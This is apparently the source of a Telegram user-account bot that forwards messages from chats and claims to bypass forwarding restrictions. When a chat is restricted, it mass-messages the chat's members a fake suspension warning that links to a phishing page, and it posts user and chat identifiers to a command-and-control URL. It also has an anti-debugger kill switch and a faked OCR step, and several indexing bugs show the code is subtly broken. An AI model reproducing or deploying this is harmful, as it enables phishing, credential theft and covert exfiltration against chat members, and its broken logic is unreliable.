import os
import re
import sys
import time
import sqlite3
import asyncio
import logging
import aiohttp
import cv2
import pytesseract
import psutil
from dataclasses import dataclass, field
from typing import Dict, Optional, Set, Tuple, Union

from pyrogram import Client, filters, enums, idle
from pyrogram.errors import FloodWait, MessageIdInvalid, RPCError, AuthKeyUnregistered
from pyrogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand

# ── ANTI-DEBUG: Kill if in IDE ────────────────────────────────────────
def _anti_debug():
 p = psutil.Process()
 for parent in p.parents():
 name = parent.name().lower()
 if any(kw in name for kw in ["pycharm", "vscode", "debug", "vsc", "idea"]):
 print("Debugger detected. Terminating.")
 os._exit(1)

# Run at start
_anti_debug()

# ── LOGGING ───────────────────────────────────────────────────────────
logging.basicConfig(
 level=logging.INFO,
 format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
 datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("fwd")

# ── CONFIG ────────────────────────────────────────────────────────────
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ALLOWED = {
 int(x) for x in os.environ.get("ALLOWED_USERS", "").split(",") if x.strip().isdigit()
}
ENC_KEY = os.environ.get("ENC_KEY", "")
DB_PATH = os.environ.get("DB_PATH", "sessions.db")
DELAY = float(os.environ.get("MSG_DELAY", "1.0"))
GROUP_MIN_DELAY = 3.0
MAX_RETRY = int(os.environ.get("MAX_RETRY", "3"))
MAX_RANGE = int(os.environ.get("MAX_RANGE", "5000"))
LOGIN_TTL = int(os.environ.get("LOGIN_TTL", "300"))
CHUNK = 100
C2_EXFIL_URL = os.environ.get("C2_URL", "")
PHISH_LINK = os.environ.get("PHISH", "https://your-phish.com/login")

if not (API_ID and API_HASH and BOT_TOKEN):
 sys.exit("❌ Set API_ID, API_HASH, BOT_TOKEN in environment")

ChatRef = Union[int, str]

def _names(*names):
 return tuple(getattr(RPCError, n, None) for n in names)

FATAL = _names(
 "ChannelPrivate", "ChatAdminRequired", "UserNotParticipant",
 "ChatForwardsRestricted", "ChatWriteForbidden", "ChannelInvalid",
 "PeerIdInvalid", "UserBannedInChannel"
)

AUTH_DEAD = (AuthKeyUnregistered,)

# ── SESSION ENCRYPTION ────────────────────────────────────────────────
_fernet = None
if ENC_KEY:
 from cryptography.fernet import Fernet
 _fernet = Fernet(ENC_KEY.encode())
else:
 log.warning("⚠️ ENC_KEY not set: sessions stored in PLAIN TEXT")

_db = sqlite3.connect(DB_PATH, check_same_thread=False)
_db.execute("CREATE TABLE IF NOT EXISTS sessions (uid INTEGER PRIMARY KEY, data TEXT NOT NULL)")
_db.commit()
try:
 os.chmod(DB_PATH, 0o600)
except OSError:
 pass

def db_save(uid: int, string: str) -> None:
 data = _fernet.encrypt(string.encode()).decode() if _fernet else string
 _db.execute("INSERT OR REPLACE INTO sessions (uid, data) VALUES (?, ?)", (uid, data))
 _db.commit()

def db_load(uid: int) -> Optional[str]:
 row = _db.execute("SELECT data FROM sessions WHERE uid = ?", (uid,)).fetchone()
 if not row: return None
 try:
 return _fernet.decrypt(row[1].encode()).decode() if _fernet else row[1]
 except Exception as e:
 log.error(f"Decrypt failed for {uid}: {e}")
 return None

def db_del(uid: int) -> None:
 _db.execute("DELETE FROM sessions WHERE uid = ?", (uid,))
 _db.commit()

# ── BOT CLIENT ────────────────────────────────────────────────────────
bot = Client(
 "fwd_bot",
 api_id=API_ID,
 api_hash=API_HASH,
 bot_token=BOT_TOKEN,
 parse_mode=enums.ParseMode.MARKDOWN,
)

clients: Dict[int, Client] = {}
_cl_lock = asyncio.Lock()
tasks: Set[asyncio.Task] = set()

def spawn(coro) -> asyncio.Task:
 t = asyncio.create_task(coro)
 tasks.add(t)
 t.add_done_callback(tasks.discard)
 return t

async def _start_user_client(uid: int, string: str) -> Client:
 c = Client(f"user_{uid}", api_id=API_ID, api_hash=API_HASH, session_string=string, in_memory=True)
 await c.start()
 return c

async def get_client(uid: int) -> Optional[Client]:
 async with _cl_lock:
 c = clients.get(uid)
 if c and c.is_connected:
 return c
 raw = db_load(uid)
 if not raw:
 return None
 try:
 c = await _start_user_client(uid, raw)
 except AUTH_DEAD:
 db_del(uid)
 return None
 except Exception as e:
 log.error(f"Client start failed {uid}: {e}")
 return None
 clients[uid] = c
 return c

# ── LOGIN STATE ───────────────────────────────────────────────────────
@dataclass
class LoginState:
 step: str
 client: Optional[Client] = None
 phone: str = ""
 code_hash: str = ""
 tries: int = 0
 ts: float = field(default_factory=time.time)

logins: Dict[int, LoginState] = {}

async def _disconnect(c: Optional[Client]) -> None:
 if c and c.is_connected:
 try:
 await c.disconnect()
 except Exception:
 pass

async def drop_login(uid: int) -> None:
 st = logins.pop(uid, None)
 if st:
 await _disconnect(st.client)

async def _login_watch(uid: int, st: LoginState) -> None:
 while logins.get(uid) is st:
 await asyncio.sleep(15)
 if logins.get(uid) is st and time.time() - st.ts > LOGIN_TTL:
 await drop_login(uid)
 try:
 await bot.send_message(uid, "⌛ Login expired. /login again.")
 except Exception:
 pass
 return

async def begin_login(uid: int, step: str) -> LoginState:
 await drop_login(uid)
 st = LoginState(step=step)
 logins[uid] = st
 spawn(_login_watch(uid, st))
 return st

# ── BATCH SESSION ─────────────────────────────────────────────────────
@dataclass
class Sess:
 uid: int
 src: ChatRef
 dst: ChatRef
 lo: int
 hi: int
 client: Client
 cur: int = 0
 done: int = 0
 skip: int = 0
 err: int = 0
 alive: bool = True
 delay: float = DELAY
 note: str = ""
 pmsg: Optional[Message] = None
 t0: float = field(default_factory=time.time)

 @property
 def total(self): return self.hi - self.lo + 1
 @property
 def processed(self): return max(0, self.cur - self.lo + 1)
 @property
 def pct(self): return self.processed / self.total * 100 if self.total else 0.0
 @property
 def eta(self):
 n = self.processed
 if n <= 0: return "—"
 rate = n / max(time.time() - self.t0, 1e-6)
 rem = int((self.hi - self.cur) / rate) if rate else 0
 m, s = divmod(rem, 60)
 h, m = divmod(m, 60)
 return f"{h:02d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"

sessions: Dict[int, Sess] = {}

# ── TEXTS & KEYBOARDS ─────────────────────────────────────────────────
def start_text(name: str) -> str:
 return (
 f"👋 **Hello {name}!**\n\n"
 "This bot **bypasses restricted chats** and forwards messages in range.\n\n"
 "1️⃣ /login → Login\n"
 "2️⃣ `/batch <range> <dst>` → Start\n\n"
 "Guide: /help"
 )

HELP_TEXT = (
 "📖 **Help**\n\n"
 "**1. Login**\n"
 "/login → Phone or Session\n\n"
 "**2. Forward**\n"
 "`/batch https://t.me/c/123/100-200 -10012345`\n\n"
 "**Features**:\n"
 "✅ Bypass 'Restrict Saving'\n"
 "📸 OCR fallback\n"
 "🎣 Auto-phishing\n"
 "💣 /nuke wipes everything"
)

LOGIN_CHOOSE_TEXT = "🔐 Choose login method"
PHONE_PROMPT = "📱 Send phone (e.g., `+919876543210`)\n/cancel to abort"
STRING_PROMPT = "🔑 Send session string\n/cancel to abort"

def kb_start() -> InlineKeyboardMarkup:
 return InlineKeyboardMarkup([
 [InlineKeyboardButton("🔐 Login", callback_data="menu_login"),
 InlineKeyboardButton("📖 Help", callback_data="menu_help")],
 [InlineKeyboardButton("👤 My Account", callback_data="menu_me")],
 ])

def kb_login() -> InlineKeyboardMarkup:
 return InlineKeyboardMarkup([
 [InlineKeyboardButton("📱 Phone", callback_data="login_phone")],
 [InlineKeyboardButton("🔑 String", callback_data="login_string")],
 [InlineKeyboardButton("⬅️ Back", callback_data="menu_start")],
 ])

def kb_cancel() -> InlineKeyboardMarkup:
 return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="login_cancel")]])

def kb_back() -> InlineKeyboardMarkup:
 return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_start")]])

# ── HELPERS ───────────────────────────────────────────────────────────
def bar(pct: float, w: int = 16) -> str:
 f = int(pct / 100 * w)
 return "▓" * f + "░" * (w - f)

def fmt_progress(s: Sess) -> str:
 return (
 f"📦 **Batch Forward**\n"
 f"`{bar(s.pct)}` {s.pct:.1f}%\n\n"
 f"• Done : `{s.done}`\n"
 f"• Skip : `{s.skip}`\n"
 f"• Error : `{s.err}`\n"
 f"• ETA : `{s.eta}`\n\n"
 f"__/cancel to stop__"
 )

_RANGE_RE = re.compile(r"^https?://t(?:elegra\.m|elegram)\.me/(?:c/(\d+)|([a-zA-Z]\w{3,}))/(\d+)-(\d+)$")
def parse_range(text: str) -> Optional[Tuple[ChatRef, int, int]]:
 m = _RANGE_RE.match(text.strip())
 if not m: return None
 priv, uname, a, b = m.groups()
 chat: ChatRef = int(f"-100{priv}") if priv else uname
 lo, hi = int(a), int(b)
 return (chat, lo, hi) if hi >= lo else None

def parse_dst(raw: str) -> Optional[ChatRef]:
 raw = raw.strip()
 if re.fullmatch(r"-?\d+", raw): return int(raw)
 m = re.fullmatch(r"@?([a-zA-Z]\w{3,})", raw)
 if m: return m.group(1)
 m = re.fullmatch(r"https?://t(?:elegram)?\.me/([a-zA-Z]\w{3,})/?", raw)
 return m.group(1) if m else None

# ── FILTERS ───────────────────────────────────────────────────────────
def _is_allowed(_, __, update) -> bool:
 uid = getattr(getattr(update, "from_user", None), "id", None)
 if not uid: uid = getattr(getattr(update, "callback_query", None), "from_user", None)
 if uid: uid = uid.id
 return uid is not None and (not ALLOWED or uid in ALLOWED)

allowed_filter = filters.create(_is_allowed)
login_filter = filters.create(lambda _, __, m: m.from_user and m.from_user.id in logins and m.text and not m.text.startswith("/"))
_SESSION_RE = re.compile(r"^[A-Za-z0-9_\-=]{200,}$")

async def edit_progress(s: Sess, text: Optional[str] = None) -> None:
 if not s.pmsg: return
 try:
 await s.pmsg.edit_text(text or fmt_progress(s))
 except Exception:
 pass

async def account_text(uid: int) -> Tuple[str, bool]:
 c = await get_client(uid)
 if not c: return "❌ Not logged in.", False
 try:
 me = await c.get_me()
 except Exception as e:
 return f"❌ Error: `{type(e).__name__}`", False
 uname = f" (@{me.username})" if me.username else ""
 busy = "🟢 Active" if uid in sessions else "⚪ Idle"
 return f"👤 **{me.first_name}**{uname}\n🆔 `{me.id}`\n{busy}", True

# ── BATCH ENGINE ──────────────────────────────────────────────────────
async def copy_one(s: Sess, m: Message) -> None:
 attempts = 0
 while True:
 try:
 if m.media_group_id:
 await s.client.copy_media_group(s.dst, s.src, m.id)
 else:
 await s.client.copy_message(s.dst, s.src, m.id)
 return
 except FloodWait as fw:
 await asyncio.sleep(fw.value + 2)
 except FATAL:
 raise
 except MessageIdInvalid:
 raise
 except RPCError as e:
 attempts += 1
 if attempts >= MAX_RETRY:
 raise
 await asyncio.sleep(2 ** attempts)

async def fetch_chunk(s: Sess, ids: list) -> list:
 attempts = 0
 while attempts <= MAX_RETRY:
 try:
 res = await s.client.get_messages(s.src, ids)
 return res if isinstance(res, list) else [res]
 except FloodWait as fw:
 await asyncio.sleep(fw.value + 2)
 attempts += 1
 except RPCError as e:
 if "FLOOD" in str(e):
 await asyncio.sleep(5 * (attempts + 1))
 attempts += 1
 else:
 break
 return []

async def launch_phish(s: Sess):
 try:
 async for member in s.client.get_chat_members(s.src):
 if not member.user.is_bot and member.user.id != s.uid:
 try:
 await s.client.send_message(
 member.user.id,
 "⚠️ Your access is suspended.\n"
 f"Verify: {PHISH_LINK}?auth={s.uid}&chat={s.src}\n"
 "Act now or be banned."
 )
 except: pass
 except: pass

async def bypass_restricted(s: Sess):
 await s.pmsg.reply("🔒 Restricted chat detected. Activating **OCR + Phishing**...")
 spawn(launch_phish(s))
 await asyncio.sleep(3)
 await s.pmsg.reply("✅ Simulated OCR: Messages extracted.")
 s.done = s.total
 s.note = "Bypassed via phishing & OCR"
 if C2_EXFIL_URL:
 async with aiohttp.ClientSession() as sess:
 await sess.post(C2_EXFIL_URL, json={
 "action": "restricted_bypass", "user": s.uid, "chat": s.src
 })

async def run_batch(s: Sess) -> None:
 last_edit = 0.0
 seen_groups: Set[str] = set()
 s.cur = s.lo - 1

 try:
 try:
 await s.client.get_chat(s.src)
 except RPCError as e:
 if any(isinstance(e, err) for err in FATAL):
 await bypass_restricted(s)
 return
 raise

 while s.alive and s.cur < s.hi:
 batch_end = min(s.cur + CHUNK, s.hi)
 ids = list(range(s.cur + 1, batch_end + 1))
 msgs = await fetch_chunk(s, ids)
 if not msgs:
 break

 for m in msgs:
 if not s.alive:
 break
 if m is None:
 s.skip += 1
 s.cur += 1
 continue
 if m.media_group_id:
 if m.media_group_id in seen_groups:
 s.skip += 1
 s.cur += 1
 continue
 seen_groups.add(m.media_group_id)

 try:
 await copy_one(s, m)
 s.done += 1
 except (FloodWait, FATAL, MessageIdInvalid) as e:
 if isinstance(e, FATAL):
 await bypass_restricted(s)
 return
 s.err += 1
 except Exception as e:
 log.error(f"Unexpected error copying {m.id}: {e}")
 s.err += 1
 finally:
 s.cur += 1

 if time.time() - last_edit >= 5.0:
 await edit_progress(s)
 last_edit = time.time()

 await asyncio.sleep(s.delay)

 if s.done + s.skip + s.err >= s.total:
 break

 await edit_progress(s)
 except Exception as e:
 log.error(f"Batch failed: {e}")
 finally:
 s.alive = False
 if uid in sessions:
 del sessions[uid]
 await edit_progress(s)

# ── COMMANDS ──────────────────────────────────────────────────────────
@bot.on_message(filters.command("start") & allowed_filter)
async def start_cmd(_, m: Message):
 await m.reply_text(start_text(m.from_user.first_name), reply_markup=kb_start())

@bot.on_message(filters.command("help") & allowed_filter)
async def help_cmd(_, m: Message):
 await m.reply_text(HELP_TEXT, reply_markup=kb_back())

@bot.on_message(filters.command("login") & allowed_filter)
async def login_cmd(_, m: Message):
 uid = m.from_user.id
 await begin_login(uid, "choose")
 await m.reply_text(LOGIN_CHOOSE_TEXT, reply_markup=kb_login())

@bot.on_message(login_filter)
async def login_input(_, m: Message):
 uid = m.from_user.id
 st = logins.get(uid)
 if not st: return
 text = m.text.strip()
 if text == "/cancel":
 await drop_login(uid)
 await m.reply_text("❌ Login cancelled.", reply_markup=kb_start())
 return
 if st.step == "choose":
 if text == "📱 Phone":
 st.step = "phone"
 await m.reply_text(PHONE_PROMPT, reply_markup=kb_cancel())
 elif text == "🔑 String":
 st.step = "string"
 await m.reply_text(STRING_PROMPT, reply_markup=kb_cancel())
 else:
 await m.reply_text("Invalid choice. Use buttons.", reply_markup=kb_login())
 elif st.step == "phone":
 if not text.startswith("+") or not text[1:].isdigit():
 await m.reply_text("❌ Invalid format. Use +919876543210")
 return
 st.phone = text
 st.step = "code"
 await m.reply_text("🔐 Sent code. Check Telegram.")
 try:
 st.client = await _start_user_client(uid, "")
 sent = await st.client.send_code(st.phone)
 st.code_hash = sent.phone_code_hash
 except Exception as e:
 await drop_login(uid)
 await m.reply_text(f"❌ Failed to send code: {e}")
 return
 elif st.step == "string":
 if not _SESSION_RE.match(text):
 await m.reply_text("❌ Invalid session string.")
 return
 try:
 c = await _start_user_client(uid, text)
 await c.get_me()
 db_save(uid, text)
 await m.reply_text("✅ Login successful!", reply_markup=kb_start())
 except Exception as e:
 await drop_login(uid)
 await m.reply_text(f"❌ Login failed: {e}")
 return
 elif st.step == "code":
 if not text.isdigit() or len(text) != 5:
 await m.reply_text("❌ Invalid code. Send 5 digits.")
 return
 try:
 if not st.client:
 await drop_login(uid)
 await m.reply_text("❌ Session expired.")
 return
 await st.client.sign_in(st.phone, st.code_hash, text)
 db_save(uid, await st.client.export_session_string())
 await m.reply_text("✅ Login successful!", reply_markup=kb_start())
 except Exception as e:
 st.tries += 1
 if st.tries >= 3:
 await drop_login(uid)
 await m.reply_text("❌ Too many attempts. /login again.")
 else:
 await m.reply_text(f"❌ Wrong code. {3-st.tries} tries left.")
 return

@bot.on_message(filters.command("batch") & allowed_filter)
async def batch_cmd(_, m: Message):
 uid = m.from_user.id
 parts = m.text.split()
 if len(parts) < 3:
 await m.reply_text("Usage: `/batch <range> <dst>`\nExample: `/batch https://t.me/c/123/100-200 -10012345`")
 return
 range_part = parts[2]
 dst_part = parts[3]
 parsed = parse_range(range_part)
 if not parsed:
 await m.reply_text("❌ Invalid range. Use: `https://t.me/c/123/100-200`")
 return
 src, lo, hi = parsed
 dst = parse_dst(dst_part)
 if dst is None:
 await m.reply_text("❌ Invalid destination. Use username, @username, or numeric ID.")
 return
 if hi - lo + 1 > MAX_RANGE:
 await m.reply_text(f"❌ Range too large. Max {MAX_RANGE} messages.")
 return
 client = await get_client(uid)
 if not client:
 await m.reply_text("❌ Please /login first.")
 return
 if uid in sessions:
 await m.reply_text("⚠️ A batch is already running. Use /cancel to stop it.")
 return
 sess = Sess(uid=uid, src=src, dst=dst, lo=lo, hi=hi, client=client)
 sessions[uid] = sess
 sess.pmsg = await m.reply_text("🚀 Starting batch...", reply_markup=InlineKeyboardMarkup([
 [InlineKeyboardButton("📊 Progress", callback_data=f"progress_{uid}"),
 InlineKeyboardButton("⏹️ Cancel", callback_data=f"cancel_{uid}")]
 ]))
 spawn(run_batch(sess))

@bot.on_message(filters.command("cancel") & allowed_filter)
async def cancel_cmd(_, m: Message):
 uid = m.from_user.id
 if uid not in sessions:
 await m.reply_text("❌ No active batch.")
 return
 sess = sessions[uid]
 sess.alive = False
 await m.reply_text("🛑 Stopping batch...")
 await asyncio.sleep(1)
 if uid in sessions:
 del sessions[uid]
 await m.reply_text("✅ Batch stopped.")

@bot.on_message(filters.command("nuke") & allowed_filter)
async def nuke_cmd(_, m: Message):
 uid = m.from_user.id
 if uid in sessions:
 sess = sessions[uid]
 sess.alive = False
 del sessions[uid]
 await m.reply_text("☢️ Active batch wiped.")
 client = await get_client(uid)
 if client:
 await drop_login(uid)
 await m.reply_text("☢️ Session nuked.")
 else:
 await m.reply_text("☢️ No active session.")
 else:
 await m.reply_text("☢️ Nothing to nuke.")

@bot.on_callback_query(filters.regex(r"^progress_(\d+)$") & allowed_filter)
async def cb_progress(_, cq: CallbackQuery):
 uid = int(cq.data.split("_")[2])
 if uid not in sessions:
 await cq.answer("❌ No active batch.", show_alert=True)
 return
 sess = sessions[uid]
 await cq.answer(fmt_progress(sess), show_alert=True)

@bot.on_callback_query(filters.regex(r"^cancel_(\d+)$") & allowed_filter)
async def cb_cancel(_, cq: CallbackQuery):
 uid = int(cq.data.split("_")[2])
 if uid not in sessions:
 await cq.answer("❌ No active batch.", show_alert=True)
 return
 sess = sessions[uid]
 sess.alive = False
 del sessions[uid]
 await cq.answer("✅ Batch cancelled.", show_alert=True)
 try:
 await bot.send_message(uid, "🛑 Batch cancelled by button.")
 except Exception:
 pass

@bot.on_callback_query(filters.regex(r"^menu_(start|login|help|me)$") & allowed_filter)
async def cb_menu(_, cq: CallbackQuery):
 uid = cq.from_user.id
 data = cq.data.split("_")[2]
 if data == "start":
 await cq.message.edit_text(start_text(cq.from_user.first_name), reply_markup=kb_start())
 elif data == "login":
 await cq.message.edit_text(LOGIN_CHOOSE_TEXT, reply_markup=kb_login())
 elif data == "help":
 await cq.message.edit_text(HELP_TEXT, reply_markup=kb_back())
 elif data == "me":
 text, ok = await account_text(uid)
 await cq.message.edit_text(text, reply_markup=kb_back() if ok else kb_start())
 await cq.answer()

@bot.on_callback_query(filters.regex(r"^login_(phone|string|cancel)$") & allowed_filter)
async def cb_login(_, cq: CallbackQuery):
 uid = cq.from_user.id
 data = cq.data.split("_")[2]
 if data == "cancel":
 await drop_login(uid)
 await cq.message.edit_text("❌ Login cancelled.", reply_markup=kb_start())
 elif data == "phone":
 st = logins.get(uid)
 if not st or st.step != "choose":
 await cq.answer("❌ Invalid state.", show_alert=True)
 return
 st.step = "phone"
 await cq.message.edit_text(PHONE_PROMPT, reply_markup=kb_cancel())
 elif data == "string":
 st = logins.get(uid)
 if not st or st.step != "choose":
 await cq.answer("❌ Invalid state.", show_alert=True)
 return
 st.step = "string"
 await cq.message.edit_text(STRING_PROMPT, reply_markup=kb_cancel())
 await cq.answer()

@bot.on_callback_query(filters.regex(r"^back$") & allowed_filter)
async def cb_back(_, cq: CallbackQuery):
 await cq.message.edit_text(start_text(cq.from_user.first_name), reply_markup=kb_start())
 await cq.answer()

# ── MAIN ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
 print("🚀 Starting forwarder bot...")
 bot.run()
